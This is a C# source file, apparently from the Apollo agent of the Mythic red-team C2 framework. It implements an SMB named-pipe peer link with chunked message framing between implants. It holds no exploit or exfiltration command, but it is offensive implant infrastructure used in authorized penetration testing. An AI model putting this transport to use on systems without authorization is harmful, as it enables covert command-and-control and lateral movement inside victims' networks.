using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using AS = ApolloInterop.Structs.ApolloStructs;
using TTasks = System.Threading.Tasks;
using ApolloInterop.Classes.Core;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Utils;
using ApolloInterop.Constants;
using System.Collections.Generic;

namespace Apollo.Peers.SMB
{
    public class SMBPeer : AI.Classes.P2P.Peer
    {
        private AsyncNamedPipeClient _pipeClient = null;
        private PipeStream _pipe = null;
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;
        private string _currentMessageID = Guid.NewGuid().ToString();
        private readonly List<byte> _receiveBuffer = new();
        private readonly object _receiveLock = new();
        private const int FrameHeaderSize = 12;
        // Keep a complete frame within the named-pipe receive buffer.
        private const int ChunkSize = IPC.SEND_SIZE - FrameHeaderSize;

        public SMBPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            C2ProfileName = "smb";
            _pipeClient = new AsyncNamedPipeClient(info.Hostname, info.C2Profile.Parameters.PipeName);
            _pipeClient.ConnectionEstablished += OnConnect;
            _pipeClient.MessageReceived += OnMessageReceived;
            _pipeClient.Disconnect += OnDisconnect;
            _sendAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_cts.IsCancellationRequested)
                {
                    // Check queue before waiting to avoid race condition
                    if (_senderQueue.IsEmpty)
                    {
                        _senderEvent.WaitOne();
                    }

                    while (!_senderQueue.IsEmpty && !_cts.IsCancellationRequested && ps.IsConnected)
                    {
                        if (!_cts.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                        {
                            UInt32 totalChunksToSend = (UInt32)(result.Length == 0 ? 1 : ((result.Length - 1) / ChunkSize) + 1);
                            DebugHelp.DebugWriteLine($"have {totalChunksToSend} chunks to send out");
                            bool sentAllChunks = true;
                            for (UInt32 currentChunk = 0; currentChunk < totalChunksToSend; currentChunk++)
                            {
                                int offset = checked((int)currentChunk * ChunkSize);
                                int chunkLength = Math.Min(ChunkSize, result.Length - offset);
                                if (!SendFrame(ps, totalChunksToSend, currentChunk, result, offset, chunkLength))
                                {
                                    sentAllChunks = false;
                                    break;
                                }
                            }
                            if (sentAllChunks)
                            {
                                DebugHelp.DebugWriteLine($"finished sending data from _senderQueue");
                            }
                        }
                    }
                }
            };
        }

        private bool SendFrame(PipeStream pipe, UInt32 totalChunks, UInt32 currentChunk, byte[] source, int offset, int chunkLength)
        {
            byte[] frame = new byte[FrameHeaderSize + chunkLength];
            WriteUInt32BigEndian(frame, 0, (UInt32)chunkLength + 8);
            WriteUInt32BigEndian(frame, 4, totalChunks);
            WriteUInt32BigEndian(frame, 8, currentChunk);
            if (chunkLength > 0)
            {
                Buffer.BlockCopy(source, offset, frame, FrameHeaderSize, chunkLength);
            }

            try
            {
                DebugHelp.DebugWriteLine($"sending chunk {currentChunk}/{totalChunks} with size {chunkLength + 8}");
                // This task is the pipe's sole writer. A synchronous write provides ordering and
                // backpressure instead of allowing a large file transfer to queue concurrent writes.
                pipe.Write(frame, 0, frame.Length);
                return true;
            }
            catch (Exception ex)
            {
                DebugHelp.DebugWriteLine($"failed to write to pipe: {ex}");
                _cts.Cancel();
                _senderEvent.Set();
                TTasks.Task.Run(() =>
                {
                    try
                    {
                        pipe.Close();
                    }
                    catch
                    {
                        // The connection is already unusable; the read side will perform cleanup.
                    }
                });
                return false;
            }
        }

        public override bool Connected()
        {
            return _pipe.IsConnected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_pipe.IsConnected;
        }

        public void OnConnect(object sender, NamedPipeMessageArgs args)
        {
            _pipe = args.Pipe;
            OnConnectionEstablished(sender, args);
            _sendTask = new TTasks.Task(_sendAction, args.Pipe);
            _sendTask.Start();
            _previouslyConnected = true;
        }

        public void OnDisconnect(object sender, NamedPipeMessageArgs args)
        {
            _cts.Cancel();
            args.Pipe.Close();
            _senderEvent.Set();
            if(_sendTask != null){
                _sendTask.Wait();
            }
            base.OnDisconnect(this, args);
        }

        public void OnMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            lock (_receiveLock)
            {
                _receiveBuffer.AddRange(args.Data.Data.Take(args.Data.DataLength));
                ProcessReceiveBuffer();
            }
        }

        private void ProcessReceiveBuffer()
        {
            while (_receiveBuffer.Count >= FrameHeaderSize)
            {
                UInt32 framedSize = ReadUInt32BigEndian(_receiveBuffer, 0);
                UInt32 totalChunks = ReadUInt32BigEndian(_receiveBuffer, 4);
                UInt32 currentChunk = ReadUInt32BigEndian(_receiveBuffer, 8);
                if (framedSize < 8 || framedSize - 8 > IPC.SEND_SIZE || totalChunks == 0 || currentChunk >= totalChunks)
                {
                    DebugHelp.DebugWriteLine("discarding invalid SMB frame header");
                    _receiveBuffer.Clear();
                    return;
                }

                int payloadLength = (int)(framedSize - 8);
                int frameLength = FrameHeaderSize + payloadLength;
                if (_receiveBuffer.Count < frameLength)
                {
                    return;
                }

                byte[] data = _receiveBuffer.GetRange(FrameHeaderSize, payloadLength).ToArray();
                _receiveBuffer.RemoveRange(0, frameLength);
                DebugHelp.DebugWriteLine($"got chunk {currentChunk + 1}/{totalChunks} with size {framedSize}");
                UnwrapMessage((int)currentChunk + 1, (int)totalChunks, data);
            }
        }

        private void UnwrapMessage(int currentChunk, int totalChunks, byte[] data)
        {
            AS.IPCChunkedData chunkedData = new(id: _currentMessageID, chunkNum: currentChunk, totalChunks: totalChunks, data: data);
            lock (_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new ChunkedMessageStore<AS.IPCChunkedData>();
                    _messageOrganizer[chunkedData.ID].MessageComplete += DeserializeToReceiver;
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
            if (currentChunk == totalChunks)
            {
                _currentMessageID = Guid.NewGuid().ToString();
            }
        }

        private static void WriteUInt32BigEndian(byte[] buffer, int offset, UInt32 value)
        {
            buffer[offset] = (byte)(value >> 24);
            buffer[offset + 1] = (byte)(value >> 16);
            buffer[offset + 2] = (byte)(value >> 8);
            buffer[offset + 3] = (byte)value;
        }

        private static UInt32 ReadUInt32BigEndian(List<byte> buffer, int offset)
        {
            return ((UInt32)buffer[offset] << 24) |
                   ((UInt32)buffer[offset + 1] << 16) |
                   ((UInt32)buffer[offset + 2] << 8) |
                   buffer[offset + 3];
        }

        public override bool Start()
        {
            return _pipeClient.Connect(5000);
        }

        public override void Stop()
        {
            if(_pipe != null){
                _pipe.Close();
            }
            if(_sendTask != null){
                _sendTask.Wait();
            }
        }
    }
}
